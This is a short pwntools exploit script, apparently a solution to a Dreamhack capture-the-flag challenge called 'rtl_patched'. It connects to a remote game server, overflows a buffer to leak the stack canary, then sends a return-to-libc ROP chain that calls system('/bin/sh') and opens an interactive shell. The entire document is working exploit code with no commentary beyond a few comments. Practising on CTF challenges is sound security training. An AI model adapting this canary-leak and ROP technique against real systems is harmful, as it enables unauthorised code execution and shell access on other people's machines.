#!/bin/python
from pwn import *
exe = ELF('./rtl_patched')
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")
p = remote('host3.dreamhack.games',   17070)
# p = process(exe.path)
# context.terminal = ['alacritty', '-e']
# gdb.attach(p, gdbscript='''
#
#
#            ''')
#################exploiting#####################
system_addr = 0x4005d0
bin_sh_addr = 0x400874
pop_rdi = 0x0000000000400853

payload = b'a'*57
p.sendafter(b'Buf:', payload)
p.recvuntil(b'a'*57)
canary_leak = u64(b'\x00'+ p.recv(7))
log.info("Canary: " + hex(canary_leak))
payload = b'a'*56
payload += p64(canary_leak)
payload += b'a'*8
payload += p64(pop_rdi) + p64(next(exe.search(b'/bin/sh'))) + p64(exe.sym['system'])


p.sendafter(b'Buf:', payload)





p.sendline(payload)
##############the end###########################
p.interactive()
